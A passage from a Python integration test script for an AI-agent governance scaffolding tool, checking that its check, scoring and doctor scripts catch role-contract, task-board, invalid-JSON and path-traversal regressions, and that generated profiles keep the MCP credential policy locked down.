        role_contracts_path = target / ".agent" / "role-contracts.json"
        role_contracts = json.loads(role_contracts_path.read_text(encoding="utf-8"))
        role_contracts["policy"]["finder_cannot_fix"] = False
        role_contracts_path.write_text(json.dumps(role_contracts, indent=2) + "\n", encoding="utf-8")
        role_contract_check = run([python, "scripts/agent_check.py"], cwd=target, expect_ok=False)
        role_contract_score = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False)
        combined_role_output = (
            role_contract_check.stdout
            + role_contract_check.stderr
            + role_contract_score.stdout
            + role_contract_score.stderr
        )
        if "finder_cannot_fix" not in combined_role_output:
            print("role contract regression was not reported", file=sys.stderr)
            print(combined_role_output, file=sys.stderr)
            return 1
        role_contracts["policy"]["finder_cannot_fix"] = True
        role_contracts_path.write_text(json.dumps(role_contracts, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_check.py"], cwd=target)

        task_board_path = target / ".agent" / "task-board.json"
        task_board = json.loads(task_board_path.read_text(encoding="utf-8"))
        task_board["items"].append(
            {
                "id": "stale-task",
                "title": "Stale task",
                "state": "active",
                "risk": "medium",
                "profile": "standard",
                "current_stage": "implementation",
                "docs_path": "docs/features/stale-task",
                "created_at": "2025-01-01T00:00:00Z",
                "updated_at": "2025-01-01T00:00:00Z",
                "delivery_conclusion": "",
                "review_gate": {
                    "required": True,
                    "status": "pending",
                    "latest_review": "",
                    "latest_fix": "",
                    "open_findings": [],
                    "accepted_exception": "",
                },
                "related_tasks": [],
            }
        )
        task_board_path.write_text(json.dumps(task_board, indent=2) + "\n", encoding="utf-8")
        gc_drift = run([python, "scripts/agent_gc.py", "doctor"], cwd=target, expect_ok=False)
        verify_drift = run([python, "scripts/agent_verify.py", "doctor"], cwd=target, expect_ok=False)
        score_drift = run([python, "scripts/agent_score.py", "score", "--json"], cwd=target, expect_ok=False)
        drift_output = gc_drift.stdout + gc_drift.stderr + verify_drift.stdout + verify_drift.stderr + score_drift.stdout + score_drift.stderr
        if "stale-task" not in drift_output or "governance_gc" not in score_drift.stdout:
            print("task-board drift did not propagate into governance scoring", file=sys.stderr)
            print(drift_output, file=sys.stderr)
            return 1
        task_board["items"] = [item for item in task_board["items"] if item.get("id") != "stale-task"]
        task_board_path.write_text(json.dumps(task_board, indent=2) + "\n", encoding="utf-8")
        run([python, "scripts/agent_check.py"], cwd=target)
        run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=target)
        run([python, "scripts/agent_verify.py", "doctor"], cwd=target)

        config_path.write_text('{"schema":"agent-project-config-v1","remote_workspace_path":"C:\\bad"\n', encoding="utf-8")
        doctor = run([python, "scripts/agent_score.py", "doctor"], cwd=target, expect_ok=False)
        score = run([python, "scripts/agent_score.py", "score", "--write"], cwd=target, expect_ok=False)
        combined_output = doctor.stdout + doctor.stderr + score.stdout + score.stderr
        if "project_integrity" not in combined_output and "invalid JSON" not in combined_output:
            print("invalid JSON was not reported as project integrity failure", file=sys.stderr)
            print(combined_output, file=sys.stderr)
            return 1

        existing = temp_root / "existing-layout"
        for directory in ("cmd", "pkg", "docs", "scripts"):
            (existing / directory).mkdir(parents=True, exist_ok=True)
        run(
            [
                python,
                str(INIT_SCRIPT),
                str(existing),
                "--layout",
                "existing",
                "--dir",
                "cmd,pkg",
                "--no-create-layout",
            ],
            cwd=PACKAGE_ROOT,
        )
        run([python, "scripts/agent_check.py"], cwd=existing)

        escaped = temp_root / "path-escape"
        escaped.mkdir(parents=True, exist_ok=True)
        escape_result = run(
            [python, str(INIT_SCRIPT), str(escaped), "--dir", "../outside"],
            cwd=PACKAGE_ROOT,
            expect_ok=False,
        )
        if "must not contain . or .." not in (escape_result.stdout + escape_result.stderr):
            print("path traversal in --dir was not rejected clearly", file=sys.stderr)
            print(escape_result.stdout, file=sys.stderr)
            print(escape_result.stderr, file=sys.stderr)
            return 1
        assert_existing_project_adoption(INIT_SCRIPT, temp_root, python)

        for profile in ("core", "standard"):
            profiled = temp_root / f"profile-{profile}"
            profiled.mkdir(parents=True, exist_ok=True)
            run(
                [
                    python,
                    str(INIT_SCRIPT),
                    str(profiled),
                    "--tech-stack",
                    "python",
                    "--layout",
                    "minimal",
                    "--remote-kind",
                    "local",
                    "--governance-profile",
                    profile,
                ],
                cwd=PACKAGE_ROOT,
            )
            run([python, "scripts/agent_check.py"], cwd=profiled)
            assert_no_missing_doc_refs(profiled)
            assert_workflow_stage_closure(profiled)
            assert_project_review_templates_are_profile_safe(profiled)
            run([python, "scripts/agent_migrate.py", "doctor"], cwd=profiled)
            run([python, "scripts/agent_score.py", "doctor"], cwd=profiled)
            score = json.loads(run([python, "scripts/agent_score.py", "score", "--json"], cwd=profiled).stdout)
            if score.get("status") != "pass":
                print(f"{profile} profile did not score pass", file=sys.stderr)
                print(json.dumps(score, indent=2), file=sys.stderr)
                return 1
            if profile == "core":
                assert_core_session_resume_is_profile_aware(profiled, python)
                if (profiled / "scripts" / "agent_verify.py").exists():
                    print("core profile unexpectedly generated agent_verify.py", file=sys.stderr)
                    return 1
            else:
                run([python, "scripts/agent_skill_hygiene.py", "doctor"], cwd=profiled)
                run([python, "scripts/agent_verify.py", "doctor"], cwd=profiled)
                run([python, "scripts/agent_gc.py", "doctor", "--fail-on-warning"], cwd=profiled)
                mcp_path = profiled / ".agent" / "mcp-policy.json"
                if not mcp_path.exists():
                    print("standard profile did not generate disabled MCP policy", file=sys.stderr)
                    return 1
                mcp_policy = json.loads(mcp_path.read_text(encoding="utf-8"))
                if mcp_policy.get("mode") != "optional-disabled-by-default":
                    print("standard profile MCP policy was not disabled by default", file=sys.stderr)
                    return 1
                for key in ("credentials_must_use_vault_or_proxy", "sandbox_must_not_receive_raw_credentials"):
                    if mcp_policy.get("policy", {}).get(key) is not True:
                        print(f"standard profile MCP policy missing {key}", file=sys.stderr)
                        return 1
                for boundary in ("credential_vault", "credential_proxy"):
                    if boundary not in mcp_policy.get("trust_boundaries", {}):
                        print(f"standard profile MCP policy missing {boundary}", file=sys.stderr)
                        return 1
                if "mcp_policy" not in score.get("dimensions", {}):
                    print("standard profile score did not include mcp_policy", file=sys.stderr)
                    return 1
                if "skill_hygiene" not in score.get("dimensions", {}):
                    print("standard profile score did not include skill_hygiene", file=sys.stderr)
                    return 1
                assert_global_skill_governance(profiled, python, temp_root)
        assert_task_board_guards(INIT_SCRIPT, temp_root, python)
    finally:
        shutil.rmtree(temp_root, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
